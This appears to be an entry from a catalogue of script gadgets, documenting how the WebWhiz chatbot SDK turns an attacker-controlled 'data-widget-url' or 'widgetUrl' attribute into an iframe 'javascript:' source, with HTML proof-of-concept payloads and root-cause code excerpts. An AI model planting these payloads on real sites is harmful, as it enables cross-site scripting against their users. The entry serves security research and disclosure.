---
description: WebWhiz allows you to create an AI chatbot that knows everything about your product and can instantly respond to your customer's queries.
github: webwhiz-ai/webwhiz
gadgets:
  Latest:
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - id-attr
      - data-attr
      - before-lib-load
    pocs:
      - description: The [WebWhiz](https://github.com/webwhiz-ai/webwhiz) library allows to load a widget `<iframe>` with a controlled `src` using the `data-widget-url` attribute.
        code: |
          <!-- user input -->
          <x id="__webwhizSdk__" data-widget-url="javascript:alert()//"></x>

          <!-- after version 1.0.0, WebWhiz must be installed using npm install -->
        preview: false
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/webwhiz-ai/webwhiz/blob/2.0.0-beta.5/widget/webwhiz-sdk.js#L267">https://github.com/webwhiz-ai/webwhiz/blob/2.0.0-beta.5/widget/webwhiz-sdk.js#L267</a>

      ```javascript
      function __WEBWHIZ__getWidgetURL() {
          const scriptEl = document.getElementById("__webwhizSdk__");
          const baseURL = scriptEl.getAttribute('widgetUrl') || scriptEl.getAttribute('data-widget-url');
          return baseURL || 'https://widget.webwhiz.ai/';
      }
      ```

      Source: <a target="_blank" href="https://github.com/webwhiz-ai/webwhiz/blob/2.0.0-beta.5/widget/webwhiz-sdk.js#L152">https://github.com/webwhiz-ai/webwhiz/blob/2.0.0-beta.5/widget/webwhiz-sdk.js#L152</a>

      ```javascript
      var __WEBWHIZ__URL = __WEBWHIZ__getWidgetURL();

      // [...]

      ifrm.setAttribute("src", __WEBWHIZ__URL + '?kbId=' + kbId +'&baseUrl=' + baseUrl);
      ```
  1.0.0:
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - id-attr
      - custom-attr
      - before-lib-load
    pocs:
      - description: The [WebWhiz](https://github.com/webwhiz-ai/webwhiz) library was allowing to load a widget `<iframe>` with a controlled `src` using the `widgetUrl` attribute.
        code: |
          <!-- user input -->
          <x id="__webwhizSdk__" widgetUrl="javascript:alert(document.domain)//"></x>

          <script src="https://www.unpkg.com/webwhiz@1.0.0/dist/sdk.js"></script>
    more-info: |
      **Root Cause**

      ```javascript
      var e=function(){let e=document.getElementById("__webwhizSdk__").getAttribute("widgetUrl");return e||"https://widget.webwhiz.ai/"}();

      // [...]

      i=document.createElement("iframe");

      // [...]

      i.setAttribute("src",e+"?kbId="+a+"&baseUrl="+s)})
      ```
---
